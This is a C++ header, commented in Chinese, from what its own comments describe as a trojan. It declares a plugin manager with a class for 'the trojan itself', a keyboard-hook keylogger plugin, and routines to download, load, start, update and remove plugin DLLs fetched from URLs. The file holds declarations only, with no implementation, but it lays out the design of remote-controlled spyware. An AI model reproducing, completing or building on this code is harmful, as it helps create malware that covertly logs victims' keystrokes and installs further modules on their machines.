/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief 插件管理类，每个实例代表一个插件
* @author 刘成伟 chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note CPlugServerInfo是基类，保存了数据和状态，请求由template method模式转发给子类
*		CTrojanPlug,CManagePlug,CKeyBoardPlug为子类，具体处理过程由他们处理
*************************************************************************/

#ifndef __TSP_PLUGININFO_H__
#define __TSP_PLUGININFO_H__

#include "ddc_util.h"
#include "TspPluginIni.hpp"
#include "KeyLogExe.h"
#include "macros.h"

/**
* @class CPlugServerInfo
* 
* @brief 单个插件信息的基类
*/
class CPlugServerInfo
{
public:
	friend class CPluginServer;

	//插件状态
	enum { STATUS_INIT,					// 类初始化，dll名称等都还没有
		STATUS_DELETE,					// 已经删除
		STATUS_WAITDOWNLOAD,			// 未下载
		STATUS_LOAD,					// 已经加载,dll_handle不为空
		STATUS_UNLOAD,					// 已经卸载,或者还未加载，dll_handle为空
		STATUS_RUNNING,					// 运行中
		STATUS_STOP,					// 停止，状态与STATUS_LOAD相同，但外部需要确认调用的是哪个函数，内部不会出现这个状态
		STATUS_ERROR,					// 出错
		STATUS_DOWNLOAD,				// 下载成功		
	};	

	enum { UPDATE_DLL=1,UPDATE_CFG=2};	// 更新参数：UPDATE_DLL为通知DllManage类进行插件更新，UPDATE_CFG更新配置信息

	/// constrator
	CPlugServerInfo();

	/// destrator
	virtual ~CPlugServerInfo();

	/**
	* 实现加载插件功能
	* @param 标志位
	* @return 成功返回0
	*/	
	int LoadPlug( DWORD dwFlag = 0 );

	/**
	* 实现卸载插件功能
	* @param 标志位
	* @return 成功返回0
	*/	
	int UnLoadPlug( DWORD dwFlag = 0 );

	/**
	* 实现启动插件功能	
	* @param 标志位
	* @return 成功返回0
	*/	
	int StartPlug( PLUGPARAM *param = NULL );

	/**
	* 停止单个插件的运行线程	
	* @param 标志位
	* @return 成功返回0
	*/
	int StopPlug( DWORD dwFlag = 0 );  	

	/**
	* 卸载插件	
	* @param 标志位
	* @return 成功返回0
	*/
	int RemovePlug( DWORD dwFlag=0); 

	/**
	* 升级插件
	* @param 标志位
	* @strConfigFile 单独解析
	* @param StartPlug()需要的参数
	* @return 成功返回0
	*/
	int UpdatePlug( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *param = 0 ); 

	/**
	* 下载单个插件
	* @param strPluginDownLoadPath 下载保存的目录
	* @return 成功返回0
	*/	
	int DownloadPlug( std::string strPluginDownLoadPath );

	/**
	* 用于比较操作，比较插件名称
	*/
	bool operator==(const std::string &other){return m_strName==other;};

	/**
	* 赋值操作符
	*/
	CPlugServerInfo& operator=(const CPlugServerInfo &other);

	/**
	* 所有字段清空，设初值
	*/
	void reset(void);

	/**
	* 设置状态
	*/
	void Status(int status) {m_status = status;};

	/**
	* 取状态
	*/
	int GetStatus(void) const{return m_status;};

protected:
	// 各种实现类声明，参数与接口完全一样，需要子类改写
	virtual int LoadPlug_i( DWORD dwFlag = 0 ){return 0;}
	virtual int UnLoadPlug_i( DWORD dwFlag = 0 ){return 0;}
	virtual int StartPlug_i( PLUGPARAM *param = NULL ){return 0;}
	virtual int StopPlug_i( DWORD dwFlag = 0 ){return 0;}
	virtual int RemovePlug_i( DWORD dwFlag=0){return 0;}
	virtual int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *){return 0;}
	
public:		// 需要给全局函数ReadPluginIniFile<>访问，模板不知道怎么声明为友元 

	string m_strName;					/// 插件名称，不带路经信息
	string m_strFullName;				/// 插件名称,带路经信息
	TCHAR m_md5[TSP_PLUGIN_SHORT_PATH];	/// md5
	TCHAR m_ver[TSP_PLUGIN_SHORT_PATH];	/// ver
	string m_strURL;					/// url,由于内存原因，使用string类
	DWORD m_dwSize;						/// 插件下载列表需要
	DWORD m_dwFlag;						/// 标志
	DWORD m_status;						/// 状态
	DWORD m_pid;						/// 数据库标志位
	string m_strRoot;					/// 系统目录名
	string m_strDir;					/// 子目录
	string m_strRealName;				/// 实际文件名
	DWORD m_dwReserved;						/// 附加数据
	char m_szReserved[TSP_PLUGIN_SHORT_PATH];	/// 附加数据

	HMODULE m_hnd;		/// dll handle,没用，handle已经被 dllmanager类管理了
};

/**
* @class CTrojanPlug
* 
* @brief 木马本身
*/
class CTrojanPlug:public CPlugServerInfo
{
public:
	int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM * = 0); 
};


/**
* @class CManagePlug
* 
* @brief 管理插件类
*/
class CManagePlug:public CPlugServerInfo
{
public:
	CManagePlug();
	~CManagePlug(){UnLoadPlug(0);};
	int LoadPlug_i( DWORD dwFlag = 0 );
	int UnLoadPlug_i( DWORD dwFlag = 0 );
	int StartPlug_i( PLUGPARAM *param = NULL );
	int StopPlug_i( DWORD dwFlag = 0 );  	
	int RemovePlug_i( DWORD dwFlag=0); 
	int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *); 
private:
	XShareMemory m_mem;								/// 与插件dll通讯的共享内存
	DWORD m_dwProcessID;
};

/**
* @class CKeyBoardPlug
* 
* @brief 键盘插件类
*/
class CKeyBoardPlug:public CPlugServerInfo
{
public:
	CKeyBoardPlug();
	int StartPlug_i( PLUGPARAM *param = NULL );
	int StopPlug_i( DWORD dwFlag = 0 );  	
	int RemovePlug_i( DWORD dwFlag=0); 
	int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *); 
private:
	// 键盘插件
	KeyBoardHook m_KeyBoarkPlugin;
};



#endif	//__TSP_PLUGININFO_H__
